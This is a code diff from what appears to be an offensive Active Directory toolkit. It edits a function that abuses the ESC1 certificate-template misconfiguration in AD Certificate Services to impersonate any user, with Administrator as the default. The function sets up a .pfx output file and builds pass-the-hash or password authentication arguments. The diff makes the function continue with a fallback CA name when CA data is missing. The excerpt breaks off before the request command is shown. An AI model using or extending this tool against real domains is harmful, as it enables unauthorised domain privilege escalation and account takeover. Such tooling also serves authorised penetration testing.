@@ -3,29 +3,24 @@ from core.helpers import run_command, save_loot
 from core.colors import red, green, yellow, blue
 
 def abuse_esc1(session, template_name):
-    from core.helpers import run_command, save_loot
-    import os
-    from core.colors import red, green, yellow, blue
-
     print(blue("[>] ESC1: Exploiting a misconfigured certificate template allowing requestor-supplied subject (e.g., UPN)."))
     print(yellow("[*] This abuse can let you impersonate any user by requesting a certificate with their UPN."))
 
     cas = session.adcs_metadata.get("cas", [])
     if not cas:
-        print(red("[-] No CA information available in session metadata. Run 'adcs enum' first."))
-        return
-
-    ca_name = cas[0].get("name")
-    if not ca_name or ca_name.lower() == "n/a":
-        print(red("[-] CA name is missing or invalid."))
-        return
+        print(yellow("[!] No CA info found in session. Using fallback values..."))
+        ca_name = "UNKNOWN-CA"
+    else:
+        ca_name = cas[0].get("name", "").strip()
+        if not ca_name or ca_name.lower() in ["n/a", "none", ""]:
+            print(yellow("[!] CA name invalid or missing. Using fallback 'UNKNOWN-CA'."))
+            ca_name = "UNKNOWN-CA"
 
     default_upn = f"Administrator@{session.domain}"
     upn = input(f"[?] Enter target UPN [default: {default_upn}]: ").strip() or default_upn
 
     output_file = f"esc1_{template_name}.pfx"
 
-    # Support password or NT hash
     if session.hash:
         auth = ["-u", f"{session.username}@{session.domain}", "-hashes", session.hash]
     elif session.password:
